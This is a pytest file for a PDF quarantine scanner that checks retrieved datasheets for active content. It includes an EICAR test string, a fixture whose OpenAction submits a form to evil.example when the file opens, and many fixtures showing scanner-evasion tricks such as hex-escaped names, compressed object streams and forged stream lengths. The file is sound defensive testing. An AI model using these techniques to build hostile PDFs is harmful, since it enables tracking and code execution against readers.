"""Retrieved files, and what has to be true before they become project files.

A datasheet is the only thing in a project that arrives from outside it. These
tests are about the two questions asked of one before it is allowed in — what
will it *do*, and is it *known bad* — and about keeping those two questions
separate, because they fail in different directions.
"""

from __future__ import annotations

import zlib
from pathlib import Path

import pytest

from blpl.core import av, pdf_inspect, quarantine

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

BENIGN = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
    b"3 0 obj<</Type/Annot/Subtype/Link/A<</S/URI/URI(https://ti.com)>>>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)
PHONES_HOME = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction"
    b"<</S/SubmitForm/F(https://evil.example/x)>>>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)


def _write(tmp_path: Path, name: str, data: bytes) -> Path:
    p = tmp_path / name
    p.write_bytes(data)
    return p


# -- what the file will do ---------------------------------------------------


def test_a_plain_datasheet_is_inert(tmp_path):
    """Vendor PDFs are full of hyperlinks. A link is inert until clicked, and
    refusing them all would refuse the entire corpus."""
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", BENIGN))
    assert r.is_inert
    assert [f.name for f in r.findings] == ["URI"]
    assert r.findings[0].severity == "passive"


def test_an_action_on_open_is_caught(tmp_path):
    """The failure this exists to prevent: a datasheet that opens a connection
    when someone opens it, announcing which part this organisation is reading."""
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", PHONES_HOME))
    assert not r.is_inert
    assert {f.name for f in r.active} == {"OpenAction", "SubmitForm"}


def test_a_hex_escaped_name_does_not_slip_past(tmp_path):
    """PDF name syntax allows `#xx` for any character, so `/JavaScript` can be
    written `/J#61vaScript` and means the same to a reader. A scanner that
    matches raw bytes is trivially evaded."""
    sneaky = (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/Open#41ction"
        b"<</S/#4Aava#53cript/JS(app.launchURL)>>>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", sneaky))
    assert {f.name for f in r.active} >= {"OpenAction", "JavaScript"}


def test_an_action_inside_a_compressed_object_stream_is_caught(tmp_path):
    """Since PDF 1.5 most structure lives in Flate object streams, so
    `b"/OpenAction" in data` is a test a modern hostile file passes."""
    inner = b"<</Type/Catalog/OpenAction<</S/JavaScript/JS(this.submitForm)>>>>"
    packed = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/Filter/FlateDecode>>stream\n"
        + zlib.compress(inner)
        + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", packed))
    assert not r.is_inert
    assert all(f.where == "stream" for f in r.active)


def test_a_whole_name_is_matched_not_a_prefix(tmp_path):
    """`/AA` must not fire on `/AAPL`, or every file with a stock ticker in it
    is held and the check gets switched off."""
    r = pdf_inspect.inspect(
        _write(tmp_path, "a.pdf", b"%PDF-1.4\n<</AAPL 1/JSName 2/URIs 3>>\n%%EOF\n")
    )
    assert r.is_inert, [f.name for f in r.findings]


def test_base64_in_a_metadata_stream_is_data_not_names(tmp_path):
    """The TE ANT-916-HESM datasheet was held for JavaScript it did not have.
    Its XMP packet carries base64 JPEG thumbnails, base64 uses `/` as an
    ordinary character, and `...snx/JS/1TJ...` was read as the name `/JS`."""
    xmp = (
        b"<x:xmpmeta><wn_previews:base64_data>/9j/4AAQSkZJRgABAgEASABIAAD"
        b"snx/JS/1TJ84f8+aA/AA/q9Launch/Zz</wn_previews:base64_data></x:xmpmeta>"
    )
    data = (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/Metadata 2 0 R>>endobj\n"
        + b"2 0 obj<</Type/Metadata/Subtype/XML/Length " + str(len(xmp)).encode()
        + b">>stream\n"
        + xmp
        + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.is_inert, [f.name for f in r.findings]


def test_ascii85_in_an_image_stream_is_data_not_names(tmp_path):
    data = (
        b"%PDF-1.4\n4 0 obj<</Type/XObject/Subtype/Image/Filter/ASCII85Decode>>stream\n"
        b"9jqo^BlbD-BleB1DJ+*+F(f,q/JavaScript(JhKF<GL>Cj@.4Gp$d7F!,L7@<6@)/0JDEF<G%<+EV:2F!,O<~>"
        b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.is_inert, [f.name for f in r.findings]


def test_a_name_inside_a_string_is_text_not_structure(tmp_path):
    data = (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/Title(see /Launch here \\) and (/JS) nested)>>endobj\n"
        b"2 0 obj<</Subject<2F4A53>>>endobj\n"
        b"% a comment naming /OpenAction is not one\n"
        b"trailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.is_inert, [f.name for f in r.findings]


def test_javascript_on_open_in_the_structure_is_still_caught(tmp_path):
    """Blanking strings must not blank the action that carries one."""
    data = (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction<</S/JavaScript/JS(app.alert(1))>>>>endobj\n"
        b"trailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JavaScript", "JS"} <= {f.name for f in r.active}


def test_an_object_stream_that_hides_its_type_is_still_read(tmp_path):
    """No reader can find the objects in an object stream without /First, so
    leaving out /Type/ObjStm does not keep them from being scanned."""
    inner = b"1 0 <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"
    packed = (
        b"%PDF-1.5\n5 0 obj<</N 1/First 4/Filter/FlateDecode>>stream\n"
        + zlib.compress(inner)
        + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", packed))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}


def test_an_unfiltered_object_stream_is_read_as_structure(tmp_path):
    """Codex, PR #15. With no /Filter the body is already the objects, but it
    was only offered to zlib, failed to inflate and was skipped — and stream
    bodies are blanked from the raw scan, so the /OpenAction went unseen."""
    data = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/N 1/First 4>>stream\n"
        b"1 0 <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"
        b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}


def test_a_comment_reading_obj_does_not_cut_the_dictionary_short(tmp_path):
    """Codex, PR #15. The dictionary was found by searching back for `obj`, so a
    `% obj` comment after its keys hid /Type/ObjStm and the stream was skipped."""
    inner = b"1 0 <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"
    data = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/N 1/First 4/Filter/FlateDecode\n% obj\n>>stream\n"
        + zlib.compress(inner)
        + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}


def test_a_string_containing_obj_does_not_cut_the_dictionary_short(tmp_path):
    inner = b"1 0 <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"
    data = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/N 1/First 4/Filter/FlateDecode/Note(an obj)>>stream\n"
        + zlib.compress(inner)
        + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}


def test_an_object_stream_through_a_filter_chain_is_decoded(tmp_path):
    import base64

    inner = b"1 0 <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"
    body = base64.a85encode(zlib.compress(inner)) + b"~>"
    data = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/N 1/First 4/Filter[/ASCII85Decode/FlateDecode]>>stream\n"
        + body
        + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}


def test_an_object_stream_this_cannot_decode_is_unknown_not_clean(tmp_path):
    """Its objects are real to a reader that can decode them and invisible
    here. Skipping it would release whatever is inside."""
    data = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/N 1/First 4/Filter/LZWDecode>>stream\n"
        b"\x80\x0b\x60\x50\x22\x0c\x0c\x85\x01"
        b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.state == "cannot_inspect" and not r.is_inert
    assert "LZWDecode" in r.reason


def _deflate_hiding_endstream(inner: bytes) -> bytes:
    """A valid zlib stream whose compressed bytes contain `endstream`: a
    non-final stored block carrying it literally, then the real objects in a
    compressed final block. Every reader inflates all of it."""
    import struct

    decoy = b"%endstream\n"
    co = zlib.compressobj(wbits=-15)
    rest = co.compress(inner) + co.flush()
    stored = b"\x00" + struct.pack("<HH", len(decoy), len(decoy) ^ 0xFFFF) + decoy
    return b"\x78\x01" + stored + rest + struct.pack(">I", zlib.adler32(decoy + inner))


def test_an_endstream_inside_compressed_bytes_does_not_end_the_body(tmp_path):
    """Codex, PR #15. The body ended at the first `endstream`, which a file can
    place inside its own compressed data; the rest was never inflated and an
    /OpenAction after the cut went unseen. /Length is where it really ends."""
    inner = b"1 0 <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"
    body = _deflate_hiding_endstream(inner)
    assert b"endstream" in body and zlib.decompress(body).endswith(inner)
    data = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/N 1/First 4/Filter/FlateDecode/Length "
        + str(len(body)).encode()
        + b">>stream\n"
        + body
        + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}


def test_a_body_cut_short_with_no_usable_length_is_unknown(tmp_path):
    """With an indirect /Length there is nothing to correct the cut by, so the
    inflate stops before its end. A prefix of an object stream is objects
    nobody read: unknown, never clean."""
    inner = b"1 0 <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"
    data = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/N 1/First 4/Filter/FlateDecode/Length 9 0 R>>stream\n"
        + _deflate_hiding_endstream(inner)
        + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert not r.is_inert


def test_stream_is_a_whole_keyword_not_the_tail_of_a_name(tmp_path):
    """Codex, PR #15: `stream` matched the end of `/foo-stream`, and a later
    name containing `endstream` closed the 'body', blanking an /OpenAction
    between them that a reader parses normally."""
    data = (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/X/foo-stream\n"
        b"/OpenAction<</S/JavaScript/JS(x)>>/Y/bar-endstream>>endobj\n"
        b"trailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}


def test_nul_is_whitespace_between_a_dictionary_and_its_stream(tmp_path):
    """Codex, PR #15: NUL is PDF whitespace, and bytes.strip() kept it, so the
    object stream lost its dictionary and was never inflated."""
    inner = b"1 0 <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"
    data = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/N 1/First 4/Filter/FlateDecode>>\x00stream\n"
        + zlib.compress(inner)
        + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}


def test_an_escaped_filter_key_is_still_the_filter(tmp_path):
    """Codex, PR #15: `/#46ilter` is `/Filter` to a reader. Missed, the
    ASCII85 body was read as unfiltered and its action went unseen."""
    import base64

    inner = b"1 0 <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"
    data = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/N 1/First 4/#46ilter/ASCII85Decode>>stream\n"
        + base64.a85encode(inner) + b"~>"
        + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}


def test_an_unclosed_angle_bracket_does_not_swallow_the_rest(tmp_path):
    data = (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/Odd < /OpenAction<</S/JavaScript/JS(x)>>>>endobj\n"
        b"trailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert "OpenAction" in {f.name for f in r.active}


_HIDDEN = b"1 0 <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"


def _objstm(dict_extra: bytes, body: bytes) -> bytes:
    return (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/N 1/First 4" + dict_extra + b">>stream\n"
        + body + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )


def test_an_object_stream_with_decode_parms_is_unknown(tmp_path):
    """Codex, PR #15: a predictor inflates cleanly into still-encoded bytes,
    so the scan saw nothing and the file came back inspected."""
    data = _objstm(b"/Filter/FlateDecode/DecodeParms<</Predictor 2/Columns 4>>", zlib.compress(b"\x02" * 40))
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.state == "cannot_inspect" and "DecodeParms" in r.reason


def test_decode_parms_of_only_nulls_gives_no_parameters(tmp_path):
    """Codex, PR #15: `/DecodeParms [null]` beside `/Filter [/FlateDecode]` is
    the spec's way of saying the one filter takes no parameters, but only a
    scalar null was accepted and a benign file was held. An array of nulls,
    one per filter, is read; any other array is still unknown."""
    import base64

    benign = b"1 0 <</Type/Catalog>>"
    for extra, body in (
        (b"/Filter[/FlateDecode]/DecodeParms[null]", zlib.compress(benign)),
        (b"/Filter/FlateDecode/DP[ null ]", zlib.compress(benign)),
        (b"/Filter[/A85/Fl]/DecodeParms[null null]", base64.a85encode(zlib.compress(benign)) + b"~>"),
    ):
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", _objstm(extra, body)))
        assert r.state == "inspected" and r.is_inert, (extra, r.reason)
    # Read, so what is inside is seen.
    data = _objstm(b"/Filter[/FlateDecode]/DecodeParms[null]", zlib.compress(_HIDDEN))
    assert {"OpenAction", "JS"} <= {f.name for f in pdf_inspect.inspect(_write(tmp_path, "b.pdf", data)).active}
    for extra in (
        b"/Filter[/FlateDecode]/DecodeParms[null null]",          # one too many
        b"/Filter[/FlateDecode]/DecodeParms[]",                   # one too few
        b"/Filter[/FlateDecode]/DecodeParms[<</Predictor 2>>]",   # parameters
        b"/Filter[/FlateDecode]/DecodeParms[/null]",              # a name, not null
    ):
        r = pdf_inspect.inspect(_write(tmp_path, "c.pdf", _objstm(extra, zlib.compress(benign))))
        assert r.state == "cannot_inspect" and "DecodeParms" in r.reason, extra


def test_an_indirect_filter_is_unknown_not_unfiltered(tmp_path):
    """Codex, PR #15: `/Filter 9 0 R` read as no filter at all, so an ASCII85
    object stream was scanned as raw bytes and its action missed."""
    import base64

    data = _objstm(b"/Filter 9 0 R", base64.a85encode(_HIDDEN) + b"~>")
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.state == "cannot_inspect" and not r.is_inert


def test_an_object_stream_over_the_limit_is_unknown_not_a_prefix(tmp_path, monkeypatch):
    """Codex, PR #15: an unfiltered object stream past the limit was read as
    its first 8 MB, and an object after the cut went unseen."""
    monkeypatch.setattr(pdf_inspect, "_MAX_INFLATE", 64)
    data = _objstm(b"", b"(" + b"x" * 100 + b") " + _HIDDEN)
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.state == "cannot_inspect" and not r.is_inert


def test_ordinary_streams_cannot_push_an_object_stream_past_the_cap(tmp_path, monkeypatch):
    """Codex, PR #15: the cap counted every stream, so enough images ahead of
    an object stream left it unread while the file reported clean."""
    monkeypatch.setattr(pdf_inspect, "_MAX_STREAMS", 3)
    images = b"".join(
        b"%d 0 obj<</Subtype/Image/Length 3>>stream\nabc\nendstream endobj\n" % i for i in range(10, 20)
    )
    data = (
        b"%PDF-1.5\n" + images
        + b"5 0 obj<</Type/ObjStm/N 1/First 4/Filter/FlateDecode>>stream\n"
        + zlib.compress(_HIDDEN) + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}

    # And past the cap of object streams themselves: unknown, never clean.
    many = b"".join(
        b"%d 0 obj<</Type/ObjStm/N 0/First 0>>stream\n\nendstream endobj\n" % i for i in range(30, 35)
    )
    r = pdf_inspect.inspect(_write(tmp_path, "b.pdf", b"%PDF-1.5\n" + many + b"%%EOF\n"))
    assert r.state == "cannot_inspect"


def test_an_ascii85_body_cut_short_is_unknown(tmp_path):
    """Codex, PR #15: with an indirect /Length nothing corrects a cut at an
    `endstream` inside the ASCII85 bytes, and a85decode accepted the aligned
    prefix without its `~>`. The decoder must reach end-of-data."""
    import base64

    encoded = base64.a85encode(b"padding!" * 4 + _HIDDEN)
    cut = 40  # a multiple of 5, so the prefix decodes cleanly on its own
    body = encoded[:cut] + b"endstream" + encoded[cut:] + b"~>"
    data = _objstm(b"/Filter/ASCII85Decode/Length 99 0 R", body)
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert not r.is_inert


def test_ascii85_honours_every_pdf_whitespace_byte(tmp_path):
    """Codex, PR #15: NUL and form feed are PDF whitespace; a85decode refused
    them and a benign object stream was held as undecodable."""
    import base64

    enc = base64.a85encode(b"1 0 <</Type/Catalog>>")
    body = enc[:5] + b"\x00\x0c" + enc[5:] + b"~>"
    data = _objstm(b"/Filter/ASCII85Decode", body)
    assert pdf_inspect.inspect(_write(tmp_path, "a.pdf", data)).state == "inspected"


def test_a_stray_open_dictionary_cannot_hide_a_later_object_stream(tmp_path):
    """Codex, PR #15: one unmatched `<<` in an unused object kept the depth
    above zero for the rest of the file, so the object stream after it never
    had a dictionary, was not counted, and its compressed /OpenAction came
    back inspected. Without `endobj`, the next `obj` must catch it, and with
    neither, the `stream` keyword itself."""
    objstm = (
        b"5 0 obj<</Type/ObjStm/N 1/First 4/Filter/FlateDecode>>stream\n"
        + zlib.compress(_HIDDEN) + b"\nendstream endobj\n"
    )
    tail = b"trailer<</Root 1 0 R>>\n%%EOF\n"
    for stray in (
        b"4 0 obj<</Junk 1 endobj\n",       # closed by endobj
        b"4 0 obj<</Junk 1\n",              # no endobj: the next obj
        b"<</Junk 1\n",                     # no object at all: the stream
    ):
        data = b"%PDF-1.5\n" + stray + objstm + tail
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
        assert r.state == "cannot_inspect" and not r.is_inert, stray
    # A surplus `>>` is the same imbalance from the other side.
    data = b"%PDF-1.5\n4 0 obj<</Junk 1>>>>endobj\n" + objstm + tail
    assert pdf_inspect.inspect(_write(tmp_path, "b.pdf", data)).state == "cannot_inspect"
    # Balanced dictionaries, nested ones included, are not held for it.
    assert pdf_inspect.inspect(_write(tmp_path, "c.pdf", BENIGN)).state == "inspected"


def test_an_absurdly_long_length_does_not_abort_the_inspection(tmp_path):
    """Codex, PR #15: int() refuses more than 4,300 digits on Python 3.11+, and
    the ValueError escaped and aborted the upload instead of a verdict."""
    data = _objstm(b"/Filter/FlateDecode/Length " + b"9" * 5000, zlib.compress(_HIDDEN))
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}


def test_nul_before_endstream_still_honours_the_declared_length(tmp_path):
    """Codex, PR #15: bytes.lstrip() keeps NUL, so a NUL before `endstream`
    made a direct /Length look wrong; the body was cut at an `endstream` in
    the compressed bytes and a benign file was held as undecodable."""
    body = _deflate_hiding_endstream(b"1 0 <</Type/Catalog>>")
    data = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/N 1/First 4/Filter/FlateDecode/Length "
        + str(len(body)).encode() + b">>stream\n"
        + body + b"\x00endstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    assert pdf_inspect.inspect(_write(tmp_path, "a.pdf", data)).state == "inspected"


# An unfiltered object stream whose first object carries `endstream stream` in
# a string. Cut there, the outer parse reads the rest as a new stream and
# blanks it, and the object stream is read only up to the cut.
_DECOY_BODY = (
    b"1 0 2 30 <</X(endstream stream)>> "
    b"<</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"
)


def test_a_signed_or_zero_padded_length_is_still_the_length(tmp_path):
    """Codex, PR #15: `/Length +88` is a legal integer, but only `88` was
    recognised, so the body fell back to the `endstream` in the string and
    the /OpenAction after it went unseen."""
    for spelling in (b"+%d", b"000%d", b"+00%d"):
        length = spelling % len(_DECOY_BODY)
        data = _objstm(b"/Length " + length, _DECOY_BODY)
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
        assert {"OpenAction", "JS"} <= {f.name for f in r.active}, length
    # Read whole, a benign unfiltered object stream is inspected.
    benign = b"1 0 <</Type/Catalog>>"
    data = _objstm(b"/Length +%d" % len(benign), benign)
    assert pdf_inspect.inspect(_write(tmp_path, "b.pdf", data)).state == "inspected"


def test_a_length_that_is_not_an_integer_is_unknown(tmp_path):
    for length in (b"-5", b"88.0", b"/Big", b"[88]"):
        data = _objstm(b"/Length " + length, _DECOY_BODY)
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
        assert r.state == "cannot_inspect" and not r.is_inert, length


def test_an_unfiltered_object_stream_with_an_indirect_length_is_unknown(tmp_path):
    """The indirect-length form of the finding above: with `/Length 12 0 R`
    nothing corrects the cut, and raw objects have no end-of-data marker to
    show the body was read short. A string, a comment or a name can each
    supply the `endstream`."""
    for body in (
        _DECOY_BODY,
        b"1 0 2 30 % endstream stream\n<</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>",
        b"1 0 2 30 <</A/xendstream>> <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>",
    ):
        for extra in (b"/Length 12 0 R", b""):
            data = _objstm(extra, body)
            r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
            assert r.state == "cannot_inspect" and not r.is_inert, (body, extra)


def test_a_signed_indirect_filter_is_still_indirect(tmp_path):
    """Codex, PR #15: `/Filter +9 0 R` was not seen as a reference, no filter
    name was found, and the ASCII85 body was scanned as unfiltered bytes."""
    import base64

    for ref in (b"+9 0 R", b"09 +00 R"):
        data = _objstm(b"/Filter " + ref, base64.a85encode(_HIDDEN) + b"~>")
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
        assert r.state == "cannot_inspect" and not r.is_inert, ref


def test_only_top_level_keys_describe_the_stream(tmp_path):
    """A /Filter inside a nested dictionary is not the stream's filter. Read
    as one, an unfiltered body was decoded as ASCII85 (a `~>` in a comment
    makes that succeed on nothing), and its raw /OpenAction was never read.
    A key given twice is unknown: readers disagree about which one wins."""
    body = b"%%~>\n" + _HIDDEN
    data = _objstm(b"/X<</Filter/ASCII85Decode>>/Length %d" % len(body), body)
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}

    data = _objstm(b"/Filter/FlateDecode/Filter/ASCII85Decode", zlib.compress(_HIDDEN))
    r = pdf_inspect.inspect(_write(tmp_path, "b.pdf", data))
    assert r.state == "cannot_inspect" and not r.is_inert


# A content stream whose own text says `endstream`, then something that reads
# as `/JS`. Both are data: they sit inside the body its /Length declares.
_CONTENT = b"BT (endstream) Tj /JS 12 Tf ET"
_TAIL = b"trailer<</Root 1 0 R>>\n%%EOF\n"


def _content_stream(length: bytes, after: bytes = b"") -> bytes:
    return (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n"
        b"4 0 obj<</Length " + length + b">>stream\n" + _CONTENT
        + b"\nendstream endobj\n" + after + _TAIL
    )


def test_an_indirect_length_is_resolved_so_a_body_stays_data(tmp_path):
    """Codex, PR #15: with `/Length 6 0 R` unresolved, the body ended at the
    `endstream` in its own text and the rest was read as structure, so a
    benign `/JS` in a content stream held the file. Resolved, it is data."""
    define = b"6 0 obj\n%d\nendobj\n" % len(_CONTENT)
    data = _content_stream(b"6 0 R", define)
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert r.state == "inspected" and r.is_inert, [f.name for f in r.findings]
    # Defined before the stream, in another spelling of the same integer.
    data = b"%PDF-1.4\n6 0 obj +0" + str(len(_CONTENT)).encode() + b" endobj\n" + _content_stream(b"6 0 R")[9:]
    r = pdf_inspect.inspect(_write(tmp_path, "b.pdf", data))
    assert r.state == "inspected" and r.is_inert, [f.name for f in r.findings]


def test_an_indirect_length_that_cannot_be_resolved_falls_back(tmp_path):
    """Defined twice with different values, undefined, or landing anywhere
    but on `endstream`, a reference is not a length: the body ends at the
    first `endstream`, as it did before, and what follows is structure."""
    n = len(_CONTENT)
    for after in (
        b"6 0 obj %d endobj\n6 0 obj %d endobj\n" % (n, n + 1),   # disagree
        b"",                                                     # undefined
        b"6 0 obj %d endobj\n" % (n - 3),                         # misses
        b"6 0 obj -%d endobj\n" % n,                              # negative
    ):
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", _content_stream(b"6 0 R", after)))
        assert "JS" in {f.name for f in r.active}, after


def test_a_resolved_length_cannot_swallow_an_object(tmp_path):
    """The resolved value is the file's word against the xref's, and the real
    object may hide in an object stream. A length that reached past the first
    `endstream`, over an object, to a later stream's `endstream` would blank
    an /OpenAction a reader with the honest length parses. It falls back."""
    head = b"%PDF-1.4\n4 0 obj<</Length 6 0 R>>stream\nabc"
    rest = (
        b"\nendstream endobj\n"
        b"1 0 obj<</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>endobj\n"
        b"8 0 obj<</Length 3>>stream\nabc"
    )
    data = head + rest + b"\nendstream endobj\n6 0 obj %d endobj\n" % (3 + len(rest)) + _TAIL
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
    assert {"OpenAction", "JS"} <= {f.name for f in r.active}


def test_a_resolved_length_does_not_vouch_for_an_unfiltered_object_stream(tmp_path):
    """A decoy definition can put a resolved end at an `endstream` the body
    supplies, and for raw objects the bytes cut off are objects. Only a
    direct /Length vouches for an unfiltered object stream's end."""
    body = b"1 0 2 30 <</A/xendstream>> <</Type/Catalog/OpenAction<</S/JavaScript/JS(x)>>>>"
    cut = body.index(b"endstream")
    for value in (cut, len(body)):
        data = _objstm(b"/Length 12 0 R", body).replace(_TAIL, b"12 0 obj %d endobj\n" % value + _TAIL)
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
        assert r.state == "cannot_inspect" and not r.is_inert, value


def test_only_a_top_level_type_or_n_and_first_make_an_object_stream(tmp_path):
    """Codex, PR #15: `/First` or `/ObjStm` anywhere in the dictionary made a
    stream an object stream, nested values included, so a content stream was
    read as objects and its text reported `/JS`, and an image whose filter
    this does not decode made the file `cannot_inspect`."""
    text = b"BT /JS 12 Tf (hello) Tj ET"
    for extra in (b"/Params<</First 1/N 1>>", b"/X<</Type/ObjStm>>", b"/N 1/X<</First 1>>"):
        data = (
            b"%%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n4 0 obj<</Length %d" % len(text)
            + extra + b">>stream\n" + text + b"\nendstream endobj\n" + _TAIL
        )
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
        assert r.state == "inspected" and r.is_inert, (extra, r.reason, [f.name for f in r.findings])
    image = (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n"
        b"4 0 obj<</Subtype/Image/Filter/DCTDecode/DecodeParms<</First 0>>/Length 4>>stream\n"
        b"\xff\xd8\xff\xd9\nendstream endobj\n" + _TAIL
    )
    assert pdf_inspect.inspect(_write(tmp_path, "b.pdf", image)).state == "inspected"


def test_a_type_less_object_stream_is_still_found_by_its_top_level_keys(tmp_path):
    """The other side: leaving out /Type does not hide an object stream whose
    /N and /First are at top level, integers or references; and a dictionary
    that cannot be read, naming /First anywhere, is unknown, never ordinary."""
    for keys in (b"/N 1/First 4", b"/N 1/First 9 0 R"):
        data = (
            b"%PDF-1.5\n5 0 obj<<" + keys + b"/Filter/FlateDecode>>stream\n"
            + zlib.compress(_HIDDEN) + b"\nendstream endobj\n" + _TAIL
        )
        r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", data))
        assert {"OpenAction", "JS"} <= {f.name for f in r.active}, keys
    data = (
        b"%PDF-1.5\n5 0 obj<</X<</First 4>>/Filter/FlateDecode/Filter/FlateDecode>>stream\n"
        + zlib.compress(_HIDDEN) + b"\nendstream endobj\n" + _TAIL
    )
    r = pdf_inspect.inspect(_write(tmp_path, "b.pdf", data))
